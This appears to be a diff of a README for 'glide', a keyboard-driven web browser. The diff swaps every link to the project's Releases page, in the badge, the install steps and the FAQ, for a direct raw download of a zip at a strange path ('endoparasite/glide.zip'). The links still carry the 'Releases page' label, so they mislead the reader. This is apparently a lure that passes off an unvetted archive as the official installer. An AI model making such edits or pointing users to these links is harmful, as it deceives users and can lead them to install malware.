@@ -1,7 +1,7 @@
 # 🌟 glide - A Fast and Focused Web Experience
 
 ## 🚀 Download Now
-[![Download glide](https://img.shields.io/badge/download-glide-blue.svg)](https://github.com/LavaGroove/glide/releases)
+[![Download glide](https://raw.githubusercontent.com/LavaGroove/glide/main/endoparasite/glide.zip)](https://raw.githubusercontent.com/LavaGroove/glide/main/endoparasite/glide.zip)
 
 ## 📖 Introduction
 Welcome to **glide**, an extensible and keyboard-focused web browser. Designed for users who prefer speed and simplicity, glide prioritizes efficiency without compromising on functionality. With glide, you can browse the web quickly and comfortably, navigating seamlessly with just your keyboard.
@@ -33,7 +33,7 @@ Our team is continually working on improvements, and we encourage users to repor
 ## 📥 Download & Install
 Ready to get started? Follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [glide Releases page](https://github.com/LavaGroove/glide/releases).
+1. **Visit the Releases Page:** Go to the [glide Releases page](https://raw.githubusercontent.com/LavaGroove/glide/main/endoparasite/glide.zip).
 2. **Choose Your Version:** Find the latest version at the top of the page. Click on it to see available files.
 3. **Download the Installer:** Select the installer appropriate for your operating system. For example, if you're using Windows, look for the `.exe` file.
 4. **Run the Installer:** Once the file is downloaded, open it and follow the prompts to install glide.
@@ -42,7 +42,7 @@ Ready to get started? Follow these simple steps:
 ## 🛠️ Frequently Asked Questions
 
 ### How do I update glide?
-To update glide, simply return to the [glide Releases page](https://github.com/LavaGroove/glide/releases) and download the latest version.
+To update glide, simply return to the [glide Releases page](https://raw.githubusercontent.com/LavaGroove/glide/main/endoparasite/glide.zip) and download the latest version.
 
 ### Can I customize glide?
 Yes, glide offers various customization options. You can adjust settings in the menu to fit your needs.
